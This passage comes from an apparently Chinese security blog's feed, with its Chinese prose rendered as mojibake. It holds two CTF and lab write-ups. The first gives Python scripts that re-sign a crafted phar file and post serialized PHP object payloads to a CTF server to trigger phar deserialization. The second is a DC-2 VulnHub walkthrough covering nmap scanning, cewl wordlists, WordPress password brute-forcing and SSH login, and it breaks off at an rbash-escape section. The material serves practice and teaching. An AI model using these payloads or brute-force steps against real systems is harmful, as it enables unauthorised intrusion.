class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Âú®ËøôÈáåÊ≥®ÊÑèÔºåÊàë‰ª¨ÊääËøô‰∏™Á±ªÂÖàËµãÁªôÊï∞ÁªÑÔºåÂÜç‰ª§ËµãÂÄºÊï∞ÁªÑ‰∏∫NULLÔºåÂÆÉÂ∞±‰ºöÂ§±ÂéªÂºïÁî®‰ªéËÄåËß¶ÂèëGCÔºåËææÂà∞ÁªïËøáGCÁöÑÁõÆÁöÑ„ÄÇ</p><p>okÔºåÁ®ãÂ∫èËøêË°åÂêé‰ºöÁîüÊàê‰∏Ä‰∏™czy.pharÊñá‰ª∂„ÄÇÊàë‰ª¨ÁúãÂÆÉÁöÑmetadataÈÉ®ÂàÜ</p><p><img src="https://img-blog.csdnimg.cn/2771c6ad047944e2b91e0608e09d73b9.png" alt="ËØ∑Ê∑ªÂä†ÂõæÁâáÊèèËø∞"></p><p>Ê≥®ÊÑèËøô0ÊòØÂ∞ÜÂØπË±°ÂÆû‰æãÂåñÁöÑÂÜÖÂÆπÔºåÁî±‰∫égetflagÈáåÈù¢‰∏∫Á©∫Ôºå‰πüÂ∞±ÊòæÁ§∫‰∫Ü<code>&#123;&#125;i</code>ÔºåËÄåËøôÈáåÁöÑ1Â∞±ÊòØnullÔºåÊ≠§Êó∂Â¶ÇÊûúÊàë‰ª¨Êää1Âº∫Ë°åÊîπ‰∏∫0ÔºåÈÇ£‰πàÂ∞±È™åËØÅ‰∫Ü‰∏äÈù¢ÁöÑËØ¥Ê≥ï<code>‰ª§ËµãÂÄºÊï∞ÁªÑ‰∏∫null</code>‰ªéËÄåËß¶ÂèëGCÊú∫Âà∂„ÄÇ‰ΩÜÊòØ‰πüË¶ÅÊ≥®ÊÑèÔºåÂÜçÂ∞Ü<code>0:&#123;&#125;i:1;N;</code>Êîπ‰∏∫<code>0:&#123;&#125;i:0;N;</code>ÂêéÔºåËØ•Êñá‰ª∂ÈúÄË¶ÅÂØπÁ≠æÂêçËøõË°å‰øÆÂ§çÔºåpharÊñá‰ª∂Áî®16ËøõÂà∂ÁºñËæëÂô®ÊâìÂºÄÂêéÂêé28‰ΩçÁöÑÂêéÂõõ‰ΩçÊòØÂõ∫ÂÆöÊ†áËØÜGBMBÔºå21-24‰Ωç‰ª£Ë°®ÁöÑÊòØsha1Á≠æÂêçÊ†áËØÜÔºåËÄå1-20‰ΩçÂú®ËøôÈáåÂ∞±ÈúÄË¶Å‰øÆÊîπ‰∫Ü„ÄÇ</p><p>ÂÄüÈâ¥‰∏Ä‰∏ãËÑöÊú¨Ôºö</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha1 <span class="token comment">#sha1Á≠æÂêç</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"czy.phar"</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>   text<span class="token operator">=</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   main<span class="token operator">=</span>text<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">28</span><span class="token punctuation">]</span>        <span class="token comment">#Ê≠£ÊñáÈÉ®ÂàÜ(Èô§ÂéªÊúÄÂêé28Â≠óËäÇ)</span>   end<span class="token operator">=</span>text<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">]</span>   new_sign<span class="token operator">=</span>sha1<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span>   new_phar<span class="token operator">=</span>main<span class="token operator">+</span>new_sign<span class="token operator">+</span>end   <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"czy.phar"</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>new_phar<span class="token punctuation">)</span>     <span class="token comment">#Â∞ÜÊñ∞ÁîüÊàêÁöÑÂÜÖÂÆπ‰ª•‰∫åËøõÂà∂ÊñπÂºèË¶ÜÁõñÂÜôÂÖ•ÂéüÊù•ÁöÑpharÊñá‰ª∂</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ËøôÈáå1-20‰ΩçÈáçÊñ∞ËøõË°å‰∫Üsha1Á≠æÂêçÔºå‰øÆÂ§çÂ•ΩÂêéÔºåÁî±‰∫épharÊñá‰ª∂ÈáåËøòÊúâgetflagÊòéÊñáÔºåÂ¶ÇÊûúË¶ÅÁªïËøáÊ≠£ÂàôÁöÑËØùÔºå‰∏Ä‰∏™ÊñπÊ≥ïÂ∞±ÊòØ<strong>‰º†Êï∞ÁªÑ</strong>Êù•ÁªïËøáÊ≠£ÂàôÔºåÂè¶‰∏ÄÁßçÂäûÊ≥ïÂ∞±ÊòØÂ∞Üczy.pharÂÜçËøõË°å‰∏ÄÊ¨°<strong>ÂéãÁº©</strong>ÔºåËøôÊ†∑Â∞±‰∏ç‰ºöÂá∫Áé∞getflagÂ≠óÊ†∑„ÄÇ</p><p>Ê≥ï‰∏ÄÔºö</p><p>‰º†Êï∞ÁªÑ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> reurl<span class="token operator">=</span><span class="token string">"http://node4.anna.nssctf.cn:28513/"</span><span class="token comment">### ÂÜôÂÖ•pharÊñá‰ª∂</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"czy.phar"</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    data1<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'0[]'</span><span class="token punctuation">:</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>                                    <span class="token comment">#Ê≥®ÊÑèËøôÈáåË¶Å‰º†Êï∞ÁªÑÔºåÊù•ÁªïËøáwaf</span>    param1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">'O:1:"A":1:&#123;s:6:"config";s:1:"w";&#125;'</span><span class="token punctuation">&#125;</span>    p1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>param1<span class="token punctuation">,</span>data<span class="token operator">=</span>data1<span class="token punctuation">)</span>    <span class="token comment">#print(p1.text)</span><span class="token comment">### ËØªpharÊñá‰ª∂ÔºåËß¶ÂèëÂèçÂ∫èÂàóÂåñ</span>param2<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token string">'O:1:"A":1:&#123;s:6:"config";s:1:"r";&#125;'</span><span class="token punctuation">&#125;</span>data2<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token string">"phar://tmp/a.txt"</span><span class="token punctuation">&#125;</span>p2<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>param2<span class="token punctuation">,</span>data<span class="token operator">=</span>data2<span class="token punctuation">)</span>p2<span class="token punctuation">.</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span>flag<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'NSSCTF\&#123;.*?\&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>findall<span class="token punctuation">(</span>p2<span class="token punctuation">.</span>text<span class="token punctuation">)</span>  <span class="token comment">#Áî®Ê≠£ÂàôÂåπÈÖçÂåπÈÖçpostÂåÖÁöÑresponse.textÈáåÁöÑ‚ÄòNSSCTF&#123;xxxxxx&#125;‚Äô</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Ê≥ï‰∫åÔºö</p><p>ÂéãÁº©czy.pharÊñá‰ª∂</p><p><img src="https://img-blog.csdnimg.cn/a43894200dcf4af8a31e75a1a9ad2ccf.png" alt="ËØ∑Ê∑ªÂä†ÂõæÁâáÊèèËø∞"></p><p>‰πãÂêé</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://node4.anna.nssctf.cn:28513/'</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>    url<span class="token punctuation">,</span>    params<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">'O:1:"A":1:&#123;s:6:"config";s:1:"w";&#125;'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    data<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token number">0</span><span class="token punctuation">:</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'czy.phar.gz'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>    url<span class="token punctuation">,</span>    params<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">'O:1:"A":1:&#123;s:6:"config";s:1:"r";&#125;'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    data<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">'phar://tmp/a.txt'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>res<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/95dfa9dfc043429a91753966aae7dffa.png" alt="2"></p><h2 id="ÂèÇËÄÉÈìæÊé•"><a href="#ÂèÇËÄÉÈìæÊé•" class="headerlink" title="ÂèÇËÄÉÈìæÊé•"></a>ÂèÇËÄÉÈìæÊé•</h2><p><a href="http://arsenetang.com/2021/11/28/%E6%B5%85%E6%9E%90GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E4%B8%8Ephar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#GC%E5%9C%A8phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E5%AE%9E%E9%99%85%E8%BF%90%E7%94%A8">ÂèÇËÄÉÈìæÊé•1</a></p><p><a href="http://xilzy666.gitee.io/xilzy/2022/03/05/nss-prize1-2/">ÂèÇËÄÉÈìæÊé•2</a></p><p><a href="https://blog.csdn.net/qq_51295677/article/details/123520193?ydreferer=aHR0cHM6Ly93d3cuYmluZy5jb20v">ÂèÇËÄÉÈìæÊé•3</a></p><p><a href="https://www.php.net/manual/zh/features.gc.php">ÂèÇËÄÉÈìæÊé•4</a></p><p><a href="https://blog.csdn.net/qq_53460654/article/details/121889104?ydreferer=aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzNDYwNjU0L2FydGljbGUvZGV0YWlscy8xMjE4ODkxMDQ=">ÂèÇËÄÉÈìæÊé•5</a></p><p><a href="https://blog.csdn.net/weixin_53090346/article/details/127598455?ydreferer=aHR0cHM6Ly93d3cuYmluZy5jb20v">ÂèÇËÄÉÈìæÊé•6</a></p>]]></content>
      
      
      <categories>
          
          <category> Áü•ËØÜÁÇπ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-2ÊâìÈù∂Á¨îËÆ∞</title>
      <link href="/2023/07/09/DC-2%E6%89%93%E9%9D%B6%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/07/09/DC-2%E6%89%93%E9%9D%B6%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="Èù∂Êú∫ÂÆâË£Ö‰ª•ÂèäÈÖçÁΩÆ"><a href="#Èù∂Êú∫ÂÆâË£Ö‰ª•ÂèäÈÖçÁΩÆ" class="headerlink" title="Èù∂Êú∫ÂÆâË£Ö‰ª•ÂèäÈÖçÁΩÆ"></a>Èù∂Êú∫ÂÆâË£Ö‰ª•ÂèäÈÖçÁΩÆ</h2><p>ÂáÜÂ§áÔºö</p><blockquote><p>kaliËôöÊãüÊú∫<br>dc-2Èù∂Êú∫<br>windows11(ÂèØÁî®ÂèØ‰∏çÁî®)</p></blockquote><p>Èù∂Âú∫‰∏ãËΩΩÂú∞ÂùÄÔºö<a href="https://download.vulnhub.com/dc/DC-2.zip">https://download.vulnhub.com/dc/DC-2.zip</a><br>‰∏ãËΩΩÂ•ΩÂêéÁî®VMÊâìÂºÄÔºåËÆæÁΩÆ‰∏∫NATÊ®°Âºè<br><img src="https://img-blog.csdnimg.cn/3a2cf2a875e2404a8b5653dde6445ccc.png" alt="1"></p><p>ÂºÄÊú∫</p><h2 id="ÊâìÈù∂"><a href="#ÊâìÈù∂" class="headerlink" title="ÊâìÈù∂"></a>ÊâìÈù∂</h2><p><strong>Êé¢Êµã‰∏ªÊú∫Â≠òÊ¥ª</strong><br>‰ΩøÁî®Â∑•ÂÖ∑nmapÔºö<code>nmap 192.168.206.136/24</code><br>Ê£ÄÊµãÂà∞dc-2Èù∂Êú∫Âú∞ÂùÄ‰∏∫192.168.206.136<br><img src="https://img-blog.csdnimg.cn/4a9b341fd14d4e7587ad30fc6bbbf3fb.png" alt="2"><br><strong>Ê∑±Â∫¶Êé¢ÊµãÈù∂Êú∫‰ø°ÊÅØ</strong></p><p><code>nmap -sV -p- 192.168.206.136</code></p><blockquote><p>-sV:Á´ØÂè£Êâ´ÊèèÂπ∂Ëé∑ÂèñÊúçÂä°ÁâàÊú¨‰ø°ÊÅØ<br>-p-:ÂÖ®Á´ØÂè£Êâ´Êèè </p></blockquote><p><img src="https://img-blog.csdnimg.cn/9129aeec46a7400e91881908ff120fa4.png" alt="3"><br>ÁôªÈôÜÁΩëÁ´ô192.168.206.136<br>ÁôªÈôÜÁΩëÁ´ôÊó∂‰ºöÂèëÁîü‰∏Ä‰∫õÈóÆÈ¢òÊòæÁ§∫<code>Did not follow redirect to http://dc-2/</code>ÔºåÊÑèÊÄùÂ∞±ÊòØÊ≤°ÊúâÈáçÂÆöÂêëÂà∞<a href="http://dc-2/%EF%BC%8C%E7%94%B1%E4%BA%8E%E6%88%91%E6%89%93%E9%9D%B6%E7%9A%84%E6%97%B6%E5%80%99%E4%BD%BF%E7%94%A8%E6%9C%AC%E6%9C%BA%E8%BF%9B%E8%A1%8C%E7%9A%84%EF%BC%8C%E5%90%8C%E6%97%B6%E4%BC%9A%E4%BD%BF%E7%94%A8kali%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7%EF%BC%8C%E9%82%A3%E4%B9%88%E9%9C%80%E8%A6%81%E5%B0%86kali%E7%9A%84hosts%E6%96%87%E4%BB%B6%EF%BC%88/etc/hosts%EF%BC%89%E6%B7%BB%E5%8A%A0%E4%B8%80%E4%B8%8B%E6%9C%AC%E5%9C%B0DNS%E8%A7%A3%E6%9E%90%E3%80%82">http://dc-2/ÔºåÁî±‰∫éÊàëÊâìÈù∂ÁöÑÊó∂ÂÄô‰ΩøÁî®Êú¨Êú∫ËøõË°åÁöÑÔºåÂêåÊó∂‰ºö‰ΩøÁî®kali‰∏äÁöÑ‰∏Ä‰∫õÂ∑•ÂÖ∑ÔºåÈÇ£‰πàÈúÄË¶ÅÂ∞ÜkaliÁöÑhostsÊñá‰ª∂Ôºà/etc/hostsÔºâÊ∑ªÂä†‰∏Ä‰∏ãÊú¨Âú∞DNSËß£Êûê„ÄÇ</a></p><p><img src="https://img-blog.csdnimg.cn/af1bd1db85754fda8912593927733dcf.png" alt="3"><br><strong>windows</strong>hostÊñá‰ª∂Âú®<code>&quot;C:\Windows\System32\drivers\etc\hosts&quot;</code>ÔºåÊ∑ªÂä†ÂÆå‰πãÂêéÂç≥ÂèØÊ≠£Â∏∏ËøõË°å„ÄÇ<br>ÊâìÂºÄÁΩëÁ´ôÂêéÊü•ÁúãÁΩëÁ´ôÊï¥‰ΩìÊ°ÜÊû∂ÔºåÂèØ‰ª•‰ΩøÁî®kali‰∏≠ÁöÑÂ∑•ÂÖ∑<code>whatweb</code>ÔºåÊàñËÄÖÊµèËßàÂô®Êèí‰ª∂<br><img src="https://img-blog.csdnimg.cn/03fd35a8fd4948e890abcd0db30f9bf3.png" alt="2"><br>ÂèØ‰ª•Áü•ÈÅìÁΩëÁ´ôÊòØwordpress<br>ÊãøÂà∞flag1<br><img src="https://img-blog.csdnimg.cn/0fc407bd818c4d52a034bf10a1cefb37.png" alt="6"></p><blockquote><p>Ê†áÂøó 1Ôºö<br>‰Ω†Â∏∏Áî®ÁöÑÂçïËØçË°®ÂèØËÉΩ‰∏çËµ∑‰ΩúÁî®ÔºåÊâÄ‰ª•Ôºå‰πüËÆ∏‰Ω†Âè™ÈúÄË¶Å cewl Âç≥ÂèØ„ÄÇ<br>ÂØÜÁ†ÅË∂äÂ§öË∂äÂ•ΩÔºå‰ΩÜÊúâÊó∂ÊÇ®Êó†Ê≥ïËµ¢ÂæóÊâÄÊúâÂØÜÁ†Å„ÄÇ<br>‰ª•‰∏Ä‰∏™Ë∫´‰ªΩÁôªÂΩïÂç≥ÂèØÊü•Áúã‰∏ã‰∏Ä‰∏™Ê†áÂøó„ÄÇ<br>Â¶ÇÊûúÊâæ‰∏çÂà∞ÔºåËØ∑‰ª•ÂÖ∂‰ªñË∫´‰ªΩÁôªÂΩï„ÄÇ</p></blockquote><p>Êü•Áúã‰∏Ä‰∏ãcewlÊòØ‰ªÄ‰πà</p><blockquote><p>cewl ÊòØ‰∏Ä‰∏™Áî®‰∫éÁîüÊàêËá™ÂÆö‰πâÂ≠óÂÖ∏Ôºàcustom wordlistÔºâÁöÑÂ∑•ÂÖ∑ÔºåÂÆÉÊòØÊ†πÊçÆÁõÆÊ†áÁΩëÁ´ôÊàñÊñáÊú¨‰∏≠ÊèêÂèñÁöÑÂçïËØçÂíåÁü≠ËØ≠ÂàõÂª∫Â≠óÂÖ∏ÁöÑ‰∏ÄÁßçÊñπÂºè„ÄÇ<br>cewl ÁöÑÂÖ®Áß∞ÊòØ ‚ÄúCustom Word List generator‚ÄùÔºåÂÆÉÊòØ‰∏Ä‰∏™Âü∫‰∫éRubyÁºñÂÜôÁöÑÂëΩ‰ª§Ë°åÂ∑•ÂÖ∑„ÄÇÂÆÉÁöÑ‰∏ªË¶ÅÂäüËÉΩÊòØÂàÜÊûêÊåáÂÆöÁöÑÊñáÊú¨ÊàñÈÄöËøáÁà¨ÂèñÁõÆÊ†áÁΩëÁ´ôÊèêÂèñÂá∫ÁöÑÂçïËØçÔºåÂπ∂Ê†πÊçÆÊèêÂèñÁöÑÂÜÖÂÆπÁîüÊàê‰∏Ä‰∏™ÂÆöÂà∂ÁöÑÂ≠óÂÖ∏„ÄÇ<br>Ëøô‰∏™Â∑•ÂÖ∑Âú®Ê∏óÈÄèÊµãËØïÂíåÂÆâÂÖ®ËØÑ‰º∞‰∏≠ÁªèÂ∏∏Áî®‰∫éÂØÜÁ†ÅÁ†¥Ëß£„ÄÅÊö¥ÂäõÊîªÂáªÂíåÁ§æ‰∫§Â∑•Á®ãÁ≠âÊñπÈù¢„ÄÇÈÄöËøáÁîüÊàêÈíàÂØπÁâπÂÆöÁõÆÊ†áÁöÑÂ≠óÂÖ∏ÔºåÊîªÂáªËÄÖÂèØ‰ª•Â∞ùËØï‰ΩøÁî®Â∏∏ËßÅÁöÑ„ÄÅÊúâÂèØËÉΩ‰∏éÁõÆÊ†áÁõ∏ÂÖ≥ÁöÑÂçïËØçÂíåÁü≠ËØ≠ËøõË°åÂØÜÁ†ÅÁ†¥Ëß£ÊàñÊîªÂáª„ÄÇ<br>cewl ÂèØ‰ª•Ê†πÊçÆ‰∏çÂêåÁöÑÈÄâÈ°πÂíåÂèÇÊï∞Êù•Ë∞ÉÊï¥Â≠óÂÖ∏ÁöÑÁîüÊàêËøáÁ®ãÔºå‰æãÂ¶ÇÊéíÈô§ÁâπÂÆöÁöÑÂçïËØç„ÄÅËÆæÁΩÆÊúÄÂ∞èÂíåÊúÄÂ§ßÈïøÂ∫¶ÈôêÂà∂„ÄÅÊåáÂÆöËæìÂá∫Êñá‰ª∂Á≠â„ÄÇ</p></blockquote><p>ÈÇ£ÊÑèÊÄùÂ∑≤ÁªèÂæàÊ∏ÖÊ•ö‰∫ÜÔºåÂ∞±ËÆ©Êàë‰ª¨ÁôªÂΩïËøõÂéªÔºåÂÖàÁî®cewlÂà∂‰ΩúÂØÜÁ†ÅÂ≠óÂÖ∏<br><code>cewl url -w Êñá‰ª∂Âêç</code>Âç≥ÂèØÁîüÊàê‰∏Ä‰∏™Â≠óÂÖ∏ÔºåÂêéÈù¢‰Ω†ÂèØ‰ª•‰ΩøÁî®wpscanËøõË°åÁî®Êà∑ÂêçÁåúËß£ÂíåÂØÜÁ†ÅÁàÜÁ†¥ÔºåÂêéÁª≠Â∞±‰∏çÊºîÁ§∫‰∫ÜÔºåÊúÄÂêéÂèØÁü•Â≠òÂú®Áî®Êà∑<strong>adminÔºåjerryÔºåtom</strong>ÂØÜÁ†ÅÂ∞±‰ΩøÁî®cewlË∑ëÂá∫Êù•ÁöÑÂØÜÁ†Å„ÄÇÊúÄÂêéÂèØ‰ª•ÊâæÂá∫jerryÂíåtomÁöÑÂØÜÁ†ÅÔºåÂêéÈù¢ÁôªÈôÜjerryÁî®Êà∑ÂêéÂèØ‰ª•ÂæóÂà∞flag2<br><img src="https://img-blog.csdnimg.cn/3381eac70aea4ae0841ad1cec1a30318.png" alt="2"></p><blockquote><p>Â¶ÇÊûú‰Ω†Êó†Ê≥ïÂà©Áî® WordPress Âπ∂Ëµ∞Êç∑ÂæÑÔºåËøòÊúâÂè¶‰∏ÄÁßçÊñπÊ≥ï„ÄÇ<br>Â∏åÊúõÊÇ®ÊâæÂà∞Âè¶‰∏Ä‰∏™ÂàáÂÖ•ÁÇπ„ÄÇ</p></blockquote><p>Âú®ËøôÈáåÊÉ≥Âà∞ÂàöÊâçÊé¢ÊµãÁ´ØÂè£ÁöÑÊó∂ÂÄôÂ≠òÂú®sshÔºå‰ΩÜÊòØÁ´ØÂè£ÊîπÂà∞‰∫Ü7744Ôºå‰ΩøÁî®sshÁôªÈôÜ‰∏Ä‰∏ã„ÄÇ<br>Áõ¥Êé•ÂÜôÁü•ËØÜÁÇπÂêßÔºåËÇù‰∏ÄÂ§©‰∫Ü„ÄÇ„ÄÇ„ÄÇ</p><h2 id="Áü•ËØÜÁÇπ"><a href="#Áü•ËØÜÁÇπ" class="headerlink" title="Áü•ËØÜÁÇπ"></a>Áü•ËØÜÁÇπ</h2><h3 id="‰∏ªÊú∫Êé¢Êµã"><a href="#‰∏ªÊú∫Êé¢Êµã" class="headerlink" title="‰∏ªÊú∫Êé¢Êµã"></a>‰∏ªÊú∫Êé¢Êµã</h3><p>Ëøô‰∏™Êó∂ÂÄô‰ΩøÁî®nmapËøõË°åÊé¢Êµã</p><blockquote><p>nmap -A -p- 192.168.206.136 ÂÖ®Á´ØÂè£Êé¢ÊµãÔºåËøòÊúâÁ´ØÂè£ÊúçÂä°‰ª•ÂèäËØ¶ÁªÜÈÖçÁΩÆ</p></blockquote><h3 id="Êú¨Âú∞DNSËÆæÁΩÆ"><a href="#Êú¨Âú∞DNSËÆæÁΩÆ" class="headerlink" title="Êú¨Âú∞DNSËÆæÁΩÆ"></a>Êú¨Âú∞DNSËÆæÁΩÆ</h3><p><strong>hostsÊñá‰ª∂Âú∞ÂùÄ</strong><br>windowsÔºö‚ÄùC:\Windows\System32\drivers\etc\hosts‚Äù<br>linuxÔºö&#x2F;etc&#x2F;hosts</p><h3 id="cewlÂ∑•ÂÖ∑ÁöÑ‰ΩøÁî®"><a href="#cewlÂ∑•ÂÖ∑ÁöÑ‰ΩøÁî®" class="headerlink" title="cewlÂ∑•ÂÖ∑ÁöÑ‰ΩøÁî®"></a>cewlÂ∑•ÂÖ∑ÁöÑ‰ΩøÁî®</h3><p>cewl ÊòØ‰∏Ä‰∏™Áî®‰∫éÁîüÊàêËá™ÂÆö‰πâÂ≠óÂÖ∏Ôºàcustom wordlistÔºâÁöÑÂ∑•ÂÖ∑ÔºåÂÆÉÊòØÊ†πÊçÆÁõÆÊ†áÁΩëÁ´ôÊàñÊñáÊú¨‰∏≠ÊèêÂèñÁöÑÂçïËØçÂíåÁü≠ËØ≠ÂàõÂª∫Â≠óÂÖ∏ÁöÑ‰∏ÄÁßçÊñπÂºè„ÄÇ</p><p>cewl ÁöÑÂÖ®Áß∞ÊòØ ‚ÄúCustom Word List generator‚ÄùÔºåÂÆÉÊòØ‰∏Ä‰∏™Âü∫‰∫éRubyÁºñÂÜôÁöÑÂëΩ‰ª§Ë°åÂ∑•ÂÖ∑„ÄÇÂÆÉÁöÑ‰∏ªË¶ÅÂäüËÉΩÊòØÂàÜÊûêÊåáÂÆöÁöÑÊñáÊú¨ÊàñÈÄöËøáÁà¨ÂèñÁõÆÊ†áÁΩëÁ´ôÊèêÂèñÂá∫ÁöÑÂçïËØçÔºåÂπ∂Ê†πÊçÆÊèêÂèñÁöÑÂÜÖÂÆπÁîüÊàê‰∏Ä‰∏™ÂÆöÂà∂ÁöÑÂ≠óÂÖ∏„ÄÇ</p><p>Ëøô‰∏™Â∑•ÂÖ∑Âú®Ê∏óÈÄèÊµãËØïÂíåÂÆâÂÖ®ËØÑ‰º∞‰∏≠ÁªèÂ∏∏Áî®‰∫éÂØÜÁ†ÅÁ†¥Ëß£„ÄÅÊö¥ÂäõÊîªÂáªÂíåÁ§æ‰∫§Â∑•Á®ãÁ≠âÊñπÈù¢„ÄÇÈÄöËøáÁîüÊàêÈíàÂØπÁâπÂÆöÁõÆÊ†áÁöÑÂ≠óÂÖ∏ÔºåÊîªÂáªËÄÖÂèØ‰ª•Â∞ùËØï‰ΩøÁî®Â∏∏ËßÅÁöÑ„ÄÅÊúâÂèØËÉΩ‰∏éÁõÆÊ†áÁõ∏ÂÖ≥ÁöÑÂçïËØçÂíåÁü≠ËØ≠ËøõË°åÂØÜÁ†ÅÁ†¥Ëß£ÊàñÊîªÂáª„ÄÇ</p><p>cewl ÂèØ‰ª•Ê†πÊçÆ‰∏çÂêåÁöÑÈÄâÈ°πÂíåÂèÇÊï∞Êù•Ë∞ÉÊï¥Â≠óÂÖ∏ÁöÑÁîüÊàêËøáÁ®ãÔºå‰æãÂ¶ÇÊéíÈô§ÁâπÂÆöÁöÑÂçïËØç„ÄÅËÆæÁΩÆÊúÄÂ∞èÂíåÊúÄÂ§ßÈïøÂ∫¶ÈôêÂà∂„ÄÅÊåáÂÆöËæìÂá∫Êñá‰ª∂Á≠â„ÄÇ<br>Âü∫Á°ÄÂëΩ‰ª§Ôºö<code>cewl url -w Êñá‰ª∂Âêç</code>ËøôÊ†∑‰πãÂêé‰ºöÁîüÊàê‰∏Ä‰∏™ÊúâÂÖ≥ËØ•ÁΩëÁ´ôÁöÑÂ≠óÂÖ∏Ôºå‰æø‰∫éÂêéÈù¢ÁàÜÁ†¥ÂØÜÁ†Å‰ΩøÁî®„ÄÇ<br><a href="https://www.freebuf.com/articles/network/190128.html">Kali LinuxÂ≠óÂÖ∏ÁîüÊàêÂ∑•ÂÖ∑Cewl‰ΩøÁî®ÂÖ®ÊåáÂçó</a></p><h3 id="sshÁôªÂΩï"><a href="#sshÁôªÂΩï" class="headerlink" title="sshÁôªÂΩï"></a>sshÁôªÂΩï</h3><p>Ëøô‰∏™tomÁî®Êà∑ÂèØ‰ª•ÁôªÂΩïÔºåjerryÁôªÈôÜ‰∏ç‰∫ÜÔºåÂØÜÁ†ÅÂ∞±ÊòØÁàÜÁ†¥Âá∫Êù•ÁöÑ„ÄÇ</p><h3 id="rbashÈÄÉÈÄ∏-ÊèêÊùÉÁöÑ‰∏ÄÁßç"><a href="#rbashÈÄÉÈÄ∏-ÊèêÊùÉÁöÑ‰∏ÄÁßç" class="headerlink" 